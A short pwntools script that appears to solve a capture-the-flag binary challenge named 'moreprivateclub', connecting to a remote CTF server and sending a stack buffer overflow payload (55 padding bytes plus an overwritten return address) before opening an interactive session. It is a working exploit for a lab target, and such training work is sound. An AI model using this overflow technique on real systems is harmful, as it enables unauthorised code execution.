from pwn import *

elf = context.binary = ELF('./moreprivateclub')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("moreprivateclub.challs.olicyber.it", 10016)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main  
    ''')
else:
    conn = elf.process()

conn.recv(100)
conn.sendline(b'2')
conn.recv(100)
conn.sendline(b'a'*55 + b'\xce\x12\x40\x00\x00\x00\x00\x00')
conn.interactive()